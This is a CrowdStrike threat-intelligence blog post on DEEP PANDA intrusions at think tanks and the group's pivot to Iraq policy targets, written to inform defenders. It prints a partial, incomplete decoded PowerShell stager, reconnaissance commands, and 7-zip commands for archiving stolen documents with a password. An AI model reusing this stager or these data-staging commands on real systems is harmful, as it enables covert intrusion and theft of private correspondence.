For some time now, CrowdStrike has been working with a number of national security think
tanks and human rights organizations on a pro bono basis to help them with their security
posture. These organizations face some of the most advanced nation-state adversaries —
China, Russia, and Iran, just to name a few. The individuals who are typically targeted at
these institutions tend to be former senior government officials who still have lots of contacts
within Western governments and, as such, their private correspondence is of extreme
interest to these attackers.
The intelligence services of these nation states are always on the lookout for any clues they
may extract from such private communications that may give them an advanced insight into
what options government policy makers are considering on particular issues of interest. At
the same time, with access to the victim email mailboxes, the adversaries can craft very
realistic spear-phishing lures to the government contacts of targeted think tank personnel by
piggybacking on ongoing real conversations and increasing their chances of a successful
compromise of an official government email account.
Despite this high threat level, these think tanks are organized as non-profits and often do not
have the budgets of commercial organizations to afford cutting-edge security technologies
that can help them effectively detect these threats. For this reason, CrowdStrike has
provided our Falcon Host endpoint security technology to many of these organizations at no
1/10

charge to them to help detect and attribute these attackers on their networks in real time, as
well as to receive instantaneous full forensic visibility into their behavior to help with full
remediation of any incident.
Recently, Falcon Host has detected multiple simultaneous compromises at several national
security think tanks from an actor we call DEEP PANDA, one of the most advanced Chinese
nation-state cyber intrusion groups. For almost three years now, CrowdStrike has monitored
DEEP PANDA targeting critical and strategic business verticals including: government,
defense, financial, legal, and the telecommunications industries. At the think tanks, Falcon
Host detected targeting of senior individuals involved in geopolitical policy issues, in
particular in the China/Asia Pacific region. However, last week the unprecedented real-time
visibility provided by Falcon Host into this actor’s escapades allowed analysts to observe a
radical change in targeting.
This actor, who was engaged in targeting and collection of Southeast Asia policy information,
suddenly began targeting individuals with a tie to Iraq/Middle East issues. This is
undoubtedly related to the recent Islamic State of Iraq and the Levant (ISIS) takeover of
major parts of Iraq and the potential disruption for major Chinese oil interests in that country.
In fact, Iraq happens to be the fifth-largest source of crude oil imports for China and the
country is the largest foreign investor in Iraq’s oil sector. Thus, it wouldn’t be surprising if the
Chinese government is highly interested in getting a better sense of the possibility of deeper
U.S. military involvement that could help protect the Chinese oil infrastructure in Iraq. In fact,
the shift in targeting of Iraq policy individuals occurred on June 18, the day that ISIS began
its attack on the Baiji oil refinery.
The Attacks
CrowdStrike’s Falcon Host technology used by these think tanks consists of a tiny (under
5mb in size) kernel sensor that is deployed on Windows and Mac servers, desktops, and
laptops and is able to do real-time detection and recording of all adversary activities taking
place on the system. In addition, by matching the detected activities against our vast
Adversary Intelligence repository, Falcon Host can automatically attribute the attack to a
known adversary group and provide details about their motivations, capabilities, and key
Tactics, Techniques, and Procedures (TTPs).
Recently, we detected breaches of these networks via the use of powershell scripts deployed
by the adversary as scheduled tasks on Windows machines. The scripts are passed to the
powershell interpreter through the command line to avoid placement of extraneous files on
the victim machine that could potentially trigger AV- or Indicator of Compromise (IOC)-based
detection.

The scripts were scheduled to call back every two hours to the DEEP PANDA Command and
Control (C2) infrastructure.

The script in the command line is base64 encoded, but when decoded it translates to the
following code snippet:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object -TypeName System.Net.WebClient
$wc.Headers.Add(“Accept-Language”, “en-US,en;q=0.” + ([IntPtr]::Size – 1).ToString())
$wc.Headers.Add(“User-Agent”, “Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;
WOW64; Trident/6.0)”)
$rndn = Get-Random
$wc.Headers.Add(“Cookie”, “p=” + $rndn)

[int]$count = 0
do
{
$count = $dfs.Read($buffer, 0, $buffer.Length)
$msout.Write($buffer, 0, $count)
} while ($count -gt 0)
$dfs.Close()

Exit
Once executed, it downloads and executes from memory a .NET executable (typically
named Wafer), which in turn typically downloads and runs MadHatter .NET Remote Access
Tool (RAT), one of the favorites of DEEP PANDA. By running them from memory, it leaves no
disk artifacts or host-based IOCs that can be identified in forensic analysis. This is typical for
DEEP PANDA — stealth is their specialty and they prefer to operate in a way that leaves a
minimal footprint on a victim system and often allows them to evade detection for a very long
time.

For this same reason, DEEP PANDA likes to use webshells to keep low-footprint persistent
access to the victim network, as we’ve covered in our prior blogs. This case was no
exception, and that initial webshell implant allowed them to execute reconnaissance
commands such as “tasklist,” “net view,” and “net localgroup administrators,” and then
afterward to deploy the powershell scripts.
The adversary used stolen credentials to mount network shares via “net use” command. In
one case, they brought in Cult of the Dead Cow’s NetE tool onto the system, but most of the
time they leveraged existing Windows tools and avoided bringing many new tools into the
environment that could make them noisy and easily detectable by technologies that scan for
static IOCs.
After using compromised credentials to mount file shares, the adversary was seen
compressing data using 7-zip. They were adding different document types to compressed
files by wildcarding the extensions, such as:
7/10

“C:Program Files7-Zip7z” a setup1.log -r -pkkk*** “\<share name>users<UserName>*rtf
*doc”
“C:Program Files7-Zip7z” a setup1.log -r -pkkk*** “\<share name>users<UserName>*ppt”
They knew exactly which users to target based on their research policy area, and they
rapidly pivoted from China/Asia Pacific policy experts to Iraq/Middle East policy experts once
their tasking collection requirements changed.

Aggressive Use of Ping to Determine Which Machines of Interest are Online
On one of the compromised machines, the adversary brought in a command-line version of
RAR archiver that was named “cftmon.exe” and placed it into “c:windowstemphotfix”
directory. The files were encrypted (both file data and headers) with “uinfw” password and

8/10

the archive files were named after the initials of each user that had been targeted and stored
in the same “c:windowstemphotfix” directory.
For lateral movement, they used WMI to deploy the powershell scripts remotely and setup
scheduled tasks on the remote systems.

Despite the fact that we were seeing nearly identical TTPs used across multiple think-tank
targets, there is evidence to indicate that these operations had different individuals behind
the keyboard based on the intricacies of how certain powershell command lines had been
used in each case.
Summary

9/10

DEEP PANDA presents a very serious threat not just to think tanks, but also multinational
financial institutions, law firms, defense contractors, and government agencies. Due to their
stellar operational security and reliance on anti-forensic and anti-IOC detection techniques,
detecting and stopping them is very challenging without the use of next-generation endpoint
technology like Falcon Host. Not only was Falcon Host able to detect this adversary without
relying on static signatures or IOCs, but it was able to provide instantaneous and full forensic
analysis of what had occurred on each of the compromised endpoints without the need to
pull hard drives and do costly and time-intensive forensics, substantially reducing the time
needed for remediation.
